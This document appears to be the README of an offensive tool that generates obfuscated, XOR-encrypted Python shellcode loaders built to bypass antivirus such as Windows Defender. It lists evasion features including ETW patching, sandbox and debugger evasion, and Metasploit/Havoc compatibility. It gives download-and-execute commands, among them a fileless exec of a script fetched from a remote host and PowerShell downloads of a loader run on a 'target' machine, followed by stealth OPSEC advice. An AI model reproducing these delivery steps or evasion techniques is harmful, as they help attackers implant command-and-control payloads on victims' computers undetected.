### Invoke-Python-ShellCodeLoader.py
--------------------------------------
'Invoke-Python-ShellCodeLoader' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
It generates an obfuscated and encrypted shellcode loader (Python script) that implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Shellcode injection into the memory of the current process (Python)
  - Shellcode encryption (XOR) and compression (Zlib)
  - Script obfuscation (randomized function and variable names + nested payloads with reflective loading)
  - ETW bypass in user-mode (patching 'NtTraceEvent')
  - Dynamic API resolution for the shellcode injection (via GetProcAddress and LoadLibraryA)
  - Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
  - Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
  - Compatible with shellcodes of multiple C2 frameworks such as Metasploit and Havoc

#### USAGE
- STEP 1. Generate an obfuscated shellcode loader (Python script) using a raw shellcode from your preferred C2 framework as input.
```
Example:
C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shellcode.bin" ".\obfuscated_shellcodeloader.py"
```

- STEP 2. Multiple options exist to download & execute the obfuscated shellcode loader (Python script) on a target Windows computer

  - Option A: Utilize a portable signed Python interpreter (www.python.org) + Fileless delivery of the obfuscated shellcode loader (Python script) 
```
1 - Download the Python embeddable package (www.python.org) which provides a signed (portable) Python interpreter with a good reputation.
    Example:
    PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
    PS C:\temp> tar -xf .\python.zip

2 - Download from a remote web server and execute directly in memory the obfuscated shellcode loader script on the target Windows machine using Python.
    This fileless delivery technique enhances stealth and helps evade static antivirus detection.
    Example:
    --------
    C:\temp\python> type .\Python-fileless-delivery.py
    #Python3
    import urllib.request
    request = urllib.request.Request('http://website/obfuscated_shellcodeloader.py')
    result = urllib.request.urlopen(request)
    payload = result.read()
    exec(payload)

    C:\temp\python> python.exe .\Python-fileless-delivery.py 
```
  - Option B: Utilize a portable signed Python interpreter (www.python.org) + Download the obfuscated shellcode loader (Python script) locally before execution.
```
1 - Download the Python embeddable package (www.python.org) which provides a signed (portable) Python interpreter with a good reputation.
    Example:
    PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
    PS C:\temp> tar -xf .\python.zip

2 - Download and store the obfuscated shellcode loader script locally on disk before executing it with Python.
    While obfuscation and encryption help evade static analysis by most antivirus solutions, this approach may offer reduced stealth compared to in-memory execution.
    Example:
    --------
    C:\temp\python> powershell -c "wget -uri http://X.X.X.X/obfuscated_shellcodeloader.py -OutFile C:\temp\python\obfuscated_shellcodeloader.py"
    C:\temp\python> python.exe .\obfuscated_shellcodeloader.py
```
  - Option C: Use PyInstaller to bundle the obfuscated shellcode loader Python script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer
```
1 - Use PyInstaller to bundle the obfuscated shellcode loader Python script into a single executable (e.g. script.exe)
    Example:
    --------
    C:\Users\auditor\Documents> pip install pyinstaller
    C:\Users\auditor\Documents>  python3 -m pip install --upgrade pip
    C:\Users\auditor\Documents\python\pyinstaller-test> python3 -m PyInstaller -F script.py -i "file.ico" --noconsole
    C:\Users\auditor\Documents\python\pyinstaller-test> dir dist
    09/04/2025  11:54 PM         5,612,531 script.exe

2 - Download and execute the obfuscated shellcode loader "script.exe" on a target Windows computer
    The obfuscation and encryption allow to evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
    Example:
    --------
    C:\temp> powershell -c "wget -uri http://X.X.X.X/script.exe -OutFile C:\temp\script.exe"
    C:\temp> script.exe
```

#### OPSEC advices
- Remove all existing comments in the script (loader template) before generating your obfuscated shellcode loader.
- When possible use fileless delivery technique to enhance stealth and evade static antivirus detection.
  
#### LICENSE
  - GNU General Public License v3.0
